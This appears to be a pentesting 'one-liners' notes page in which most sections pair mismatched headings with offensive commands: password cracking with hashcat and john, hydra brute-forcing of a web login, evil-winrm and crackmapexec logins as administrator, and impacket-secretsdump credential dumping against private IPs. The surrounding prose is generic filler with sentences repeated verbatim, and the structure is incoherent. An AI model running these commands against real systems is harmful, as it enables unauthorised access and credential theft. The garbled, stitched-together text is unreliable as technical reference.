---
TitleSEO: "Bash One-Liners for Security Testing | ZureFX"
TitlePost: "Bash One-Liners for Security Testing"
Author: "ZureFX"
Description: "Personal notes on Bash One-Liners for Security Testing. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, malware, cheatsheet"
URL: "https://zurefx.github.io/notes/note-bash-one-liners-for-security-testing-602.html"
URL_IMAGES: ""
Date: "2025-09-24"
Tags: "Enumeration, Malware, Cheatsheet"
Section: "notes"
Lang: "en"
main_img: "note-bash-one-liners-for-security-testing-602"
Permalink: "/notes/note-bash-one-liners-for-security-testing-602.html"
BtnLabel: "Read Notes"
Pick: 0
---
## nikto

### feroxbuster

- `atexec`
- `NTLM Relay`
- `crackmapexec`

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p110,5986,53 10.78.43.149 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
crackmapexec smb 10.75.184.90 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.83.98.162 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p80,5432,110 10.83.166.114 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## PHP

### Silver Ticket

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

```powershell
feroxbuster -h
```

```powershell
evil-winrm -i 10.50.126.75 -u administrator -p 'P@ssw0rd!'
```

- `ldapsearch`
- `SeDebugPrivilege`
- `GPP Password`
- `wpscan`
- `sqlmap`

## Pass the Ticket

### Unconstrained Delegation

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.100.173.242 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.117.39.235 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.81.61.99 -u administrator -p 'P@ssw0rd!'
```

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

## MongoDB

### secretsdump

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
gobuster dir -u http://10.51.12.66/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.83.106.80 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.224.88
```

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.
